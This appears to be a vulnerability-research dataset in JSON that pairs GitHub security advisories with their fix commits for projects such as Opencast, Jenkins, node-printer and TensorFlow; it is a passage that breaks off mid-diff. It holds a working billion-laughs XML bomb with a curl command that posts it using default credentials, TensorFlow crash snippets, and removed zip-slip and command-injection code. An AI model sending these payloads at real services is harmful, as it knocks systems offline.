{
  "schema": {
    "fields": [
      {
        "name": "index",
        "type": "integer"
      },
      {
        "name": "vuln_id",
        "type": "string"
      },
      {
        "name": "cwe_id",
        "type": "string"
      },
      {
        "name": "score",
        "type": "number"
      },
      {
        "name": "chain",
        "type": "string"
      },
      {
        "name": "dataset",
        "type": "string"
      },
      {
        "name": "summary",
        "type": "string"
      },
      {
        "name": "published_date",
        "type": "string"
      },
      {
        "name": "chain_len",
        "type": "integer"
      },
      {
        "name": "project",
        "type": "string"
      },
      {
        "name": "commit_href",
        "type": "string"
      },
      {
        "name": "commit_sha",
        "type": "string"
      },
      {
        "name": "patch",
        "type": "string"
      },
      {
        "name": "chain_ord",
        "type": "string"
      },
      {
        "name": "before_first_fix_commit",
        "type": "string"
      },
      {
        "name": "last_fix_commit",
        "type": "string"
      },
      {
        "name": "chain_ord_pos",
        "type": "number"
      },
      {
        "name": "commit_datetime",
        "type": "string"
      },
      {
        "name": "message",
        "type": "string"
      },
      {
        "name": "author",
        "type": "string"
      },
      {
        "name": "comments",
        "type": "string"
      },
      {
        "name": "stats",
        "type": "string"
      },
      {
        "name": "files",
        "type": "string"
      },
      {
        "name": "message_norm",
        "type": "string"
      },
      {
        "name": "language",
        "type": "string"
      },
      {
        "name": "entities",
        "type": "string"
      },
      {
        "name": "classification_level_1",
        "type": "string"
      },
      {
        "name": "classification_level_2",
        "type": "string"
      },
      {
        "name": "list_files",
        "type": "string"
      },
      {
        "name": "num_files",
        "type": "number"
      }
    ],
    "primaryKey": [
      "index"
    ],
    "pandas_version": "1.4.0"
  },
  "data": [
    {
      "index": 1374,
      "vuln_id": "GHSA-9gwx-9cwp-5c2m",
      "cwe_id": "{'CWE-776'}",
      "score": 8.1,
      "chain": "{'https://github.com/opencast/opencast/commit/8ae27da5a6f658011a5741b3210e715b0dc6213e', 'https://github.com/opencast/opencast/commit/16b0d641713fe31b8518fcf14fc5e4e815d81206'}",
      "dataset": "osv",
      "summary": "Billion laughs attack (XML bomb) ### Impact\n\nOpencast is vulnerable to the [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)  which allows an attacker to easily execute a (seemingly permanent) denial of service attack, essentially taking down Opencast using a single HTTP request.\n\nConsider an XML file (`createMediaPackage.xml`) like this:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE lolz [\n <!ENTITY lol \"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum. \">\n <!ELEMENT title (#PCDATA)>\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n]>\n<mediapackage xmlns=\"http://mediapackage.opencastproject.org\" id=\"d162d5b2-b54f-4400-a268-ee6565b0e6e7\" start=\"2020-01-23T23:08:37Z\">\n  <title>&lol5;</title>\n  <media/>\n  <metadata/>\n  <attachments/>\n  <publications/>\n</mediapackage>\n```\n\nThrowing this at Opencast will cause Opencast to parse the XML and expand the Lorem Ipsum about 100\u00a0000 times, instantly consuming a huge amount of memory:\n\n```sh\ncurl -i -u admin:opencast https://develop.opencast.org/ingestdownload/ingestdownload \\\n  -F 'mediapackage=<createMediaPackage.xml' \\\n  -F sourceFlavors=\"\" \\\n  -F sourceTags=\"\" \\\n  -F deleteExternal=\"\" \\\n  -F tagsAndFlavor='' \\\n  -o out.xml\n```\n\nAdditional notes:\n\n- You can likely use other endpoints accepting XML (this was just the first one I tried) and depending on how much memory you want to consume, you might want to enlarge the lorem ipsum text.\n- Opencast's XML parser does limit the expansion to 100\u00a0000 times, already limiting the attack. Nevertheless, this can already harm the system. \n- To exploit this, users need to have ingest privileges, limiting the group of potential attackers\n\n### Patches\n\nThe problem has been fixed in Opencast 9.6. Older versions of Opencast are not patched sue to the extent of this patch.\n\n### Workarounds\n\nThere is no known workaround for this issue.\n\n### References\n\n- [Billion laughs attack explained](https://en.wikipedia.org/wiki/Billion_laughs_attack)\n- For technical details, take a look at the patch fixing the issue: https://github.com/opencast/opencast/commit/_________\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [our issue tracker](https://github.com/opencast/opencast/issues)\n- Email us at [security@opencast.org](mailto:security@opencast.org)",
      "published_date": "2021-06-17",
      "chain_len": 2,
      "project": "https://github.com/opencast/opencast",
      "commit_href": "https://github.com/opencast/opencast/commit/8ae27da5a6f658011a5741b3210e715b0dc6213e",
      "commit_sha": "8ae27da5a6f658011a5741b3210e715b0dc6213e",
      "patch": "MULTI",
      "chain_ord": "['16b0d641713fe31b8518fcf14fc5e4e815d81206', '8ae27da5a6f658011a5741b3210e715b0dc6213e']",
      "before_first_fix_commit": "{'27f401f37e92564d5a89ef71ab6a5aa6c59ee6fc'}",
      "last_fix_commit": "8ae27da5a6f658011a5741b3210e715b0dc6213e",
      "chain_ord_pos": 2.0,
      "commit_datetime": "06/15/2021, 10:36:31",
      "message": "Clarifies debug options in setenv file (#2735)\n\nCo-authored-by: Lars Kiesow <lkiesow@uos.de>",
      "author": "Maximiliano Lira Del Canto",
      "comments": null,
      "stats": "{'additions': 5, 'deletions': 1, 'total': 6}",
      "files": "{'assemblies/resources/bin/setenv': {'additions': 5, 'deletions': 1, 'changes': 6, 'status': 'modified', 'raw_url': 'https://github.com/opencast/opencast/raw/8ae27da5a6f658011a5741b3210e715b0dc6213e/assemblies%2Fresources%2Fbin%2Fsetenv', 'patch': '@@ -31,8 +31,12 @@\\n # export KARAF_BASE        # Karaf base folder\\n # export KARAF_ETC         # Karaf etc  folder\\n # export KARAF_OPTS        # Additional Karaf options\\n-# export KARAF_DEBUG       # Enable debug mode\\n # export KARAF_REDIRECT    # Enable/set the std/err redirection when using bin/start\\n+#\\n+# Debug options\\n+# export KARAF_DEBUG       # Enable debug mode\\n+# export JAVA_DEBUG_PORT   # Set debug port (defaults to 5005)\\n+\\n \\n export EXTRA_JAVA_OPTS=\"${EXTRA_JAVA_OPTS} -Dorg.eclipse.jetty.server.Request.maxFormContentSize=1500000 -Dfile.encoding=UTF-8\"\\n export JAVA_MAX_MEM=\"${JAVA_MAX_MEM:-1G}\"'}}",
      "message_norm": "clarifies debug options in setenv file (#2735)\n\nco-authored-by: lars kiesow <lkiesow@uos.de>",
      "language": "en",
      "entities": "[('#2735', 'ISSUE', ''), ('lkiesow@uos.de', 'EMAIL', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['assemblies/resources/bin/setenv'])",
      "num_files": 1.0
    },
    {
      "index": 1792,
      "vuln_id": "GHSA-fx7m-j728-mjw3",
      "cwe_id": "{'CWE-185'}",
      "score": 5.3,
      "chain": "{'https://github.com/ua-parser/uap-core/commit/010ccdc7303546cd22b9da687c29f4a996990014', 'https://github.com/ua-parser/uap-core/commit/156f7e12b215bddbaf3df4514c399d683e6cdadc'}",
      "dataset": "osv",
      "summary": "Moderate severity vulnerability that affects uap-core An issue was discovered in regex.yaml (aka regexes.yaml) in UA-Parser UAP-Core before 0.6.0. A Regular Expression Denial of Service (ReDoS) issue allows remote attackers to overload a server by setting the User-Agent header in an HTTP(S) request to a value containing a long digit string. (The UAP-Core project contains the vulnerability, propagating to all implementations.)",
      "published_date": "2019-03-06",
      "chain_len": 2,
      "project": "https://github.com/ua-parser/uap-core",
      "commit_href": "https://github.com/ua-parser/uap-core/commit/010ccdc7303546cd22b9da687c29f4a996990014",
      "commit_sha": "010ccdc7303546cd22b9da687c29f4a996990014",
      "patch": "MULTI",
      "chain_ord": "['156f7e12b215bddbaf3df4514c399d683e6cdadc', '010ccdc7303546cd22b9da687c29f4a996990014']",
      "before_first_fix_commit": "{'764947f552c6fc9ac80759acb5165a83ee746678'}",
      "last_fix_commit": "010ccdc7303546cd22b9da687c29f4a996990014",
      "chain_ord_pos": 2.0,
      "commit_datetime": "12/14/2018, 07:19:47",
      "message": "0.6.0",
      "author": "commenthol",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'package.json': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/ua-parser/uap-core/raw/010ccdc7303546cd22b9da687c29f4a996990014/package.json', 'patch': '@@ -1,7 +1,7 @@\\n {\\n   \"name\": \"uap-core\",\\n   \"description\": \"The regex file necessary to build language ports of Browserscope\\'s user agent parser.\",\\n-  \"version\": \"0.5.0\",\\n+  \"version\": \"0.6.0\",\\n   \"maintainers\": [\\n     {\\n       \"name\": \"Tobie Langel\",'}}",
      "message_norm": "0.6.0",
      "language": "",
      "entities": "[('0.6.0', 'VERSION', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['package.json'])",
      "num_files": 1.0
    },
    {
      "index": 3591,
      "vuln_id": "GHSA-qpg9-83fv-x9ch",
      "cwe_id": "{'CWE-79'}",
      "score": null,
      "chain": "{'https://github.com/jenkinsci/jenkins/commit/d393c7e9ba3ec44953ef1f8b11839421e2649ee7', 'https://github.com/jenkinsci/jenkins/commit/8eb632dda219ec8796420ce58d9564cddf8f8f93'}",
      "dataset": "osv",
      "summary": "Improper Neutralization of Input During Web Page Generation in Jenkins The f:validateButton form control for the Jenkins UI did not properly escape job URLs in Jenkins 2.171 and earlier and Jenkins LTS 2.164.1 and earlier, resulting in a cross-site scripting (XSS) vulnerability exploitable by users with the ability to control job names.",
      "published_date": "2022-05-13",
      "chain_len": 2,
      "project": "https://github.com/jenkinsci/jenkins",
      "commit_href": "https://github.com/jenkinsci/jenkins/commit/d393c7e9ba3ec44953ef1f8b11839421e2649ee7",
      "commit_sha": "d393c7e9ba3ec44953ef1f8b11839421e2649ee7",
      "patch": "MULTI",
      "chain_ord": "['8eb632dda219ec8796420ce58d9564cddf8f8f93', 'd393c7e9ba3ec44953ef1f8b11839421e2649ee7']",
      "before_first_fix_commit": "{'bcb8ae87d5d9d348abf80039de2921eb3ced8959'}",
      "last_fix_commit": "d393c7e9ba3ec44953ef1f8b11839421e2649ee7",
      "chain_ord_pos": 2.0,
      "commit_datetime": "03/26/2019, 20:54:27",
      "message": "[SECURITY-1327] Adapt test to new HTML Unit",
      "author": "Daniel Beck",
      "comments": null,
      "stats": "{'additions': 4, 'deletions': 2, 'total': 6}",
      "files": "{'test/src/test/java/lib/form/ValidateButtonSEC1327Test.java': {'additions': 4, 'deletions': 2, 'changes': 6, 'status': 'modified', 'raw_url': 'https://github.com/jenkinsci/jenkins/raw/d393c7e9ba3ec44953ef1f8b11839421e2649ee7/test%2Fsrc%2Ftest%2Fjava%2Flib%2Fform%2FValidateButtonSEC1327Test.java', 'patch': '@@ -24,7 +24,9 @@\\n package lib.form;\\n \\n import com.gargoylesoftware.htmlunit.html.HtmlButton;\\n+import com.gargoylesoftware.htmlunit.html.HtmlElement;\\n import com.gargoylesoftware.htmlunit.html.HtmlPage;\\n+import com.gargoylesoftware.htmlunit.html.DomNodeList;\\n import hudson.model.FreeStyleProject;\\n import hudson.model.Job;\\n import hudson.model.JobProperty;\\n@@ -72,8 +74,8 @@ private void checkValidateButtonWork(String projectName) throws Exception {\\n         HtmlPage htmlPage = wc.goTo(p.getUrl() + \"/configure\");\\n         assertThat(htmlPage.getWebResponse().getStatusCode(), is(200));\\n \\n-        List<HtmlButton> inputs = htmlPage.getDocumentElement().getHtmlElementsByTagName(\"button\");\\n-        HtmlButton validateButton = inputs.stream()\\n+         DomNodeList<HtmlElement> inputs = htmlPage.getDocumentElement().getElementsByTagName(\"button\");\\n+         HtmlButton validateButton = (HtmlButton) inputs.stream()\\n                 .filter(i -> i.getTextContent().contains(\"testInjection\"))\\n                 .findFirst()\\n                 .orElseThrow(() -> new AssertionError(\"Validate button not found\"));'}}",
      "message_norm": "[security-1327] adapt test to new html unit",
      "language": "en",
      "entities": "[('security-1327', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['test/src/test/java/lib/form/ValidateButtonSEC1327Test.java'])",
      "num_files": 1.0
    },
    {
      "index": 1687,
      "vuln_id": "GHSA-f7r3-p866-q9qr",
      "cwe_id": "{'CWE-400'}",
      "score": 3.7,
      "chain": "{'https://github.com/Twipped/ircdkit/pull/2/commits/595ed02cde517fad57854d2ac2855a09a626e665', 'https://github.com/Twipped/ircdkit/commit/f0cc6dc913ec17b499fa33a676bb72c624456f2c'}",
      "dataset": "osv",
      "summary": "ircdkit vulnerable to Denial of Service due to unhandled connection end event Versions of `ircdkit` 1.0.3 and prior are vulnerable to a remote denial of service.\n\n\n## Recommendation\n\nUpgrade to version 1.0.4.",
      "published_date": "2019-06-03",
      "chain_len": 2,
      "project": "https://github.com/Twipped/ircdkit",
      "commit_href": "https://github.com/Twipped/ircdkit/pull/2/commits/595ed02cde517fad57854d2ac2855a09a626e665",
      "commit_sha": "595ed02cde517fad57854d2ac2855a09a626e665",
      "patch": "MULTI",
      "chain_ord": "['f0cc6dc913ec17b499fa33a676bb72c624456f2c', '595ed02cde517fad57854d2ac2855a09a626e665']",
      "before_first_fix_commit": "{'74aa751e75a90af34ef63377fcbd41285d155380'}",
      "last_fix_commit": "595ed02cde517fad57854d2ac2855a09a626e665",
      "chain_ord_pos": 2.0,
      "commit_datetime": "05/30/2019, 03:10:50",
      "message": "Update index.js\n\ncorrected unhandled connection 'end' event, fixes issue #1",
      "author": "Trinity Fox",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'lib/index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/Twipped/ircdkit/raw/595ed02cde517fad57854d2ac2855a09a626e665/lib%2Findex.js', 'patch': \"@@ -47,7 +47,7 @@ function create (options) {\\n \\n \\t\\tclient.on('end', function () {\\n \\t\\t\\tdebug('connection ended');\\n-\\t\\t\\tremoveClient(client);\\n+\\t\\t\\tclient.close();\\n \\t\\t\\tapp.emit('connection:end', client);\\n \\t\\t});\"}}",
      "message_norm": "update index.js\n\ncorrected unhandled connection 'end' event, fixes issue #1",
      "language": "en",
      "entities": "[('update', 'ACTION', ''), ('#1', 'ISSUE', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['lib/index.js'])",
      "num_files": 1.0
    },
    {
      "index": 610,
      "vuln_id": "GHSA-5c8j-xr24-2665",
      "cwe_id": "{'CWE-77'}",
      "score": 9.8,
      "chain": "{'https://github.com/tojocky/node-printer/commit/e001e38738c17219a1d9dd8c31f7d82b9c0013c7'}",
      "dataset": "osv",
      "summary": "Potential Command Injection in printer Versions 0.0.1 and earlier of `printer` are affected by a command injection vulnerability resulting from a failure to sanitize command arguments properly in the `printDirect()` function. \n\n\n\n## Recommendation\n\nUpdate to version 0.0.2 or later.",
      "published_date": "2017-11-28",
      "chain_len": 1,
      "project": "https://github.com/tojocky/node-printer",
      "commit_href": "https://github.com/tojocky/node-printer/commit/e001e38738c17219a1d9dd8c31f7d82b9c0013c7",
      "commit_sha": "e001e38738c17219a1d9dd8c31f7d82b9c0013c7",
      "patch": "SINGLE",
      "chain_ord": "['e001e38738c17219a1d9dd8c31f7d82b9c0013c7']",
      "before_first_fix_commit": "{'7987544670c37fdef659f8ee9e5db20fae118705'}",
      "last_fix_commit": "e001e38738c17219a1d9dd8c31f7d82b9c0013c7",
      "chain_ord_pos": 1.0,
      "commit_datetime": "06/28/2013, 18:30:28",
      "message": "Removed possible command injection",
      "author": "chieffancypants",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'lib/printer.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/tojocky/node-printer/raw/e001e38738c17219a1d9dd8c31f7d82b9c0013c7/lib%2Fprinter.js', 'patch': '@@ -93,7 +93,7 @@ function printDirect(parameters){\\n     }else if (!printer_helper.printDirect){// should be POSIX\\n         var temp_file_name = path.join(os.tmpDir(),\"printing\");\\n         fs.writeFileSync(temp_file_name, data);\\n-        child_process.exec(\\'lpr -P\\'+printer+\\' -oraw -r\\'+\\' \\'+temp_file_name, function(err, stdout, stderr){\\n+        child_process.execFile(\\'lpr\\', [\\'-P\\' + printer, \\'-oraw\\', \\'-r\\', temp_file_name], function(err, stdout, stderr){\\n             if (err !== null) {\\n                 error(\\'ERROR: \\' + err);\\n                 return;'}}",
      "message_norm": "removed possible command injection",
      "language": "en",
      "entities": "[('removed', 'ACTION', ''), ('possible command injection', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['lib/printer.js'])",
      "num_files": 1.0
    },
    {
      "index": 1383,
      "vuln_id": "GHSA-9hr3-j9mc-xmq2",
      "cwe_id": "{'CWE-29', 'CWE-22'}",
      "score": 6.9,
      "chain": "{'https://github.com/alibaba/one-java-agent/pull/29/commits/359603b63fc6c59d8b57e061c171954bab3433bf', 'https://github.com/alibaba/one-java-agent/pull/29/commits/b5b437f9f4c8cbfe7bdbe266e975a4bd513c13fe'}",
      "dataset": "osv",
      "summary": "Path Traversal in com.alibaba.oneagent:one-java-agent-plugin All versions of package `com.alibaba.oneagent:one-java-agent-plugin` are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip) using a specially crafted archive that holds directory traversal filenames (e.g. `../../evil.exe`). The attacker can overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim\u2019s machine.",
      "published_date": "2022-05-03",
      "chain_len": 2,
      "project": "https://github.com/alibaba/one-java-agent",
      "commit_href": "https://github.com/alibaba/one-java-agent/pull/29/commits/359603b63fc6c59d8b57e061c171954bab3433bf",
      "commit_sha": "359603b63fc6c59d8b57e061c171954bab3433bf",
      "patch": "MULTI",
      "chain_ord": "['359603b63fc6c59d8b57e061c171954bab3433bf', 'b5b437f9f4c8cbfe7bdbe266e975a4bd513c13fe']",
      "before_first_fix_commit": "{'52f2506c7cbcfbbe342ddf9d35a915fc49e6fa48'}",
      "last_fix_commit": "b5b437f9f4c8cbfe7bdbe266e975a4bd513c13fe",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/07/2022, 02:28:31",
      "message": "remove unused IOUtils.unzip",
      "author": "luyanbo",
      "comments": null,
      "stats": "{'additions': 0, 'deletions': 56, 'total': 56}",
      "files": "{'one-java-agent-plugin/src/main/java/com/alibaba/oneagent/utils/IOUtils.java': {'additions': 0, 'deletions': 56, 'changes': 56, 'status': 'modified', 'raw_url': 'https://github.com/alibaba/one-java-agent/raw/359603b63fc6c59d8b57e061c171954bab3433bf/one-java-agent-plugin%2Fsrc%2Fmain%2Fjava%2Fcom%2Falibaba%2Foneagent%2Futils%2FIOUtils.java', 'patch': '@@ -103,60 +103,4 @@ public static IOException close(URLClassLoader urlClassLoader) {\\n \\t\\treturn null;\\n \\t}\\n \\n-\\tpublic static void unzip(String zipFile, String extractFolder) throws IOException {\\n-\\t\\tFile file = new File(zipFile);\\n-\\t\\tZipFile zip = null;\\n-\\t\\ttry {\\n-\\t\\t\\tint BUFFER = 1024 * 8;\\n-\\n-\\t\\t\\tzip = new ZipFile(file);\\n-\\t\\t\\tString newPath = extractFolder;\\n-\\n-\\t\\t\\tnew File(newPath).mkdir();\\n-\\t\\t\\tEnumeration<? extends ZipEntry> zipFileEntries = zip.entries();\\n-\\n-\\t\\t\\t// Process each entry\\n-\\t\\t\\twhile (zipFileEntries.hasMoreElements()) {\\n-\\t\\t\\t\\t// grab a zip file entry\\n-\\t\\t\\t\\tZipEntry entry = (ZipEntry) zipFileEntries.nextElement();\\n-\\t\\t\\t\\tString currentEntry = entry.getName();\\n-\\n-\\t\\t\\t\\tFile destFile = new File(newPath, currentEntry);\\n-\\t\\t\\t\\t// destFile = new File(newPath, destFile.getName());\\n-\\t\\t\\t\\tFile destinationParent = destFile.getParentFile();\\n-\\n-\\t\\t\\t\\t// create the parent directory structure if needed\\n-\\t\\t\\t\\tdestinationParent.mkdirs();\\n-\\n-\\t\\t\\t\\tif (!entry.isDirectory()) {\\n-\\t\\t\\t\\t\\tBufferedInputStream is = null;\\n-\\t\\t\\t\\t\\tBufferedOutputStream dest = null;\\n-\\t\\t\\t\\t\\ttry {\\n-\\t\\t\\t\\t\\t\\tis = new BufferedInputStream(zip.getInputStream(entry));\\n-\\t\\t\\t\\t\\t\\tint currentByte;\\n-\\t\\t\\t\\t\\t\\t// establish buffer for writing file\\n-\\t\\t\\t\\t\\t\\tbyte data[] = new byte[BUFFER];\\n-\\n-\\t\\t\\t\\t\\t\\t// write the current file to disk\\n-\\t\\t\\t\\t\\t\\tFileOutputStream fos = new FileOutputStream(destFile);\\n-\\t\\t\\t\\t\\t\\tdest = new BufferedOutputStream(fos, BUFFER);\\n-\\n-\\t\\t\\t\\t\\t\\t// read and write until last byte is encountered\\n-\\t\\t\\t\\t\\t\\twhile ((currentByte = is.read(data, 0, BUFFER)) != -1) {\\n-\\t\\t\\t\\t\\t\\t\\tdest.write(data, 0, currentByte);\\n-\\t\\t\\t\\t\\t\\t}\\n-\\t\\t\\t\\t\\t\\tdest.flush();\\n-\\t\\t\\t\\t\\t} finally {\\n-\\t\\t\\t\\t\\t\\tclose(dest);\\n-\\t\\t\\t\\t\\t\\tclose(is);\\n-\\t\\t\\t\\t\\t}\\n-\\n-\\t\\t\\t\\t}\\n-\\n-\\t\\t\\t}\\n-\\t\\t} finally {\\n-\\t\\t\\tclose(zip);\\n-\\t\\t}\\n-\\n-\\t}\\n }'}}",
      "message_norm": "remove unused ioutils.unzip",
      "language": "en",
      "entities": "[('remove', 'ACTION', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['one-java-agent-plugin/src/main/java/com/alibaba/oneagent/utils/IOUtils.java'])",
      "num_files": 1.0
    },
    {
      "index": 1519,
      "vuln_id": "GHSA-c968-pq7h-7fxv",
      "cwe_id": "{'CWE-369'}",
      "score": 2.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/311403edbc9816df80274bd1ea8b3c0c0f22c3fa'}",
      "dataset": "osv",
      "summary": "Division by 0 in `Conv3DBackprop*` ### Impact\nThe `tf.raw_ops.Conv3DBackprop*` operations fail to validate that the input tensors are not empty. In turn, this would result in a division by 0:\n\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([0, 0, 0, 0, 0], shape=[5], dtype=tf.int32)\nfilter_tensor = tf.constant([], shape=[0, 0, 0, 1, 0], dtype=tf.float32)\nout_backprop = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\n                            \ntf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n```\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([1], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\nfilter_tensor = tf.constant([0, 0, 0, 1, 0], shape=[5], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[1, 1, 1, 1, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/a91bb59769f19146d5a0c20060244378e878f140/tensorflow/core/kernels/conv_grad_ops_3d.cc#L430-L450) does not check that the divisor used in computing the shard size is not zero:\n\n```cc\n  const int64 size_A = output_image_size * dims.out_depth;\n  const int64 size_B = filter_total_size * dims.out_depth;\n  const int64 size_C = output_image_size * filter_total_size;\n  const int64 work_unit_size = size_A + size_B + size_C;\n  ...\n  const size_t shard_size =\n      use_parallel_contraction\n        ? 1\n        : (target_working_set_size + work_unit_size - 1) / work_unit_size;\n```\n\nThus, if attacker controls the input sizes, they can trigger a denial of service via a division by zero error.\n\n### Patches\nWe have patched the issue in GitHub commit [311403edbc9816df80274bd1ea8b3c0c0f22c3fa](https://github.com/tensorflow/tensorflow/commit/311403edbc9816df80274bd1ea8b3c0c0f22c3fa).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/311403edbc9816df80274bd1ea8b3c0c0f22c3fa",
      "commit_sha": "311403edbc9816df80274bd1ea8b3c0c0f22c3fa",
      "patch": "SINGLE",
      "chain_ord": "['311403edbc9816df80274bd1ea8b3c0c0f22c3fa']",
      "before_first_fix_commit": "{'a91bb59769f19146d5a0c20060244378e878f140'}",
      "last_fix_commit": "311403edbc9816df80274bd1ea8b3c0c0f22c3fa",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/19/2021, 23:00:40",
      "message": "Eliminate a division by 0 in 3D convolutions.\n\nAlso prevent a CHECK failed introduced in the most recent change.\n\nPiperOrigin-RevId: 369322073\nChange-Id: I4f609c028f89565fb2b49c3fdd20b63496582bae",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 42, 'deletions': 0, 'total': 42}",
      "files": "{'tensorflow/core/kernels/conv_grad_ops_3d.cc': {'additions': 42, 'deletions': 0, 'changes': 42, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/311403edbc9816df80274bd1ea8b3c0c0f22c3fa/tensorflow%2Fcore%2Fkernels%2Fconv_grad_ops_3d.cc', 'patch': '@@ -239,6 +239,14 @@ class Conv3DBackpropInputOp : public OpKernel {\\n       input_shape = context->input(0).shape();\\n     }\\n \\n+    OP_REQUIRES(context, input_shape.dims() == 5,\\n+                errors::InvalidArgument(\"input tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, filter_shape.dims() == 5,\\n+        errors::InvalidArgument(\"filter_sizes tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dims() == 5,\\n+        errors::InvalidArgument(\"out_backprop tensor must have 5 dimensions\"));\\n     OP_REQUIRES(\\n         context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n         errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n@@ -360,6 +368,14 @@ class Conv3DCustomBackpropInputOp : public OpKernel {\\n       input_shape = context->input(0).shape();\\n     }\\n \\n+    OP_REQUIRES(context, input_shape.dims() == 5,\\n+                errors::InvalidArgument(\"input tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, filter_shape.dims() == 5,\\n+        errors::InvalidArgument(\"filter_sizes tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dims() == 5,\\n+        errors::InvalidArgument(\"out_backprop tensor must have 5 dimensions\"));\\n     OP_REQUIRES(\\n         context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n         errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n@@ -444,6 +460,11 @@ class Conv3DCustomBackpropInputOp : public OpKernel {\\n     // contraction compared to sharding and matmuls.\\n     const bool use_parallel_contraction = dims.batch_size == 1;\\n \\n+    OP_REQUIRES(\\n+        context, work_unit_size > 0,\\n+        errors::InvalidArgument(\"input, filter_sizes and out_backprop tensors \"\\n+                                \"must all have at least 1 element\"));\\n+\\n     const size_t shard_size =\\n         use_parallel_contraction\\n             ? 1\\n@@ -724,6 +745,14 @@ class Conv3DBackpropFilterOp : public OpKernel {\\n       filter_shape = context->input(1).shape();\\n     }\\n \\n+    OP_REQUIRES(context, input_shape.dims() == 5,\\n+                errors::InvalidArgument(\"input tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, filter_shape.dims() == 5,\\n+        errors::InvalidArgument(\"filter_sizes tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dims() == 5,\\n+        errors::InvalidArgument(\"out_backprop tensor must have 5 dimensions\"));\\n     OP_REQUIRES(\\n         context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n         errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n@@ -850,6 +879,14 @@ class Conv3DCustomBackpropFilterOp : public OpKernel {\\n       filter_shape = context->input(1).shape();\\n     }\\n \\n+    OP_REQUIRES(context, input_shape.dims() == 5,\\n+                errors::InvalidArgument(\"input tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, filter_shape.dims() == 5,\\n+        errors::InvalidArgument(\"filter_sizes tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, 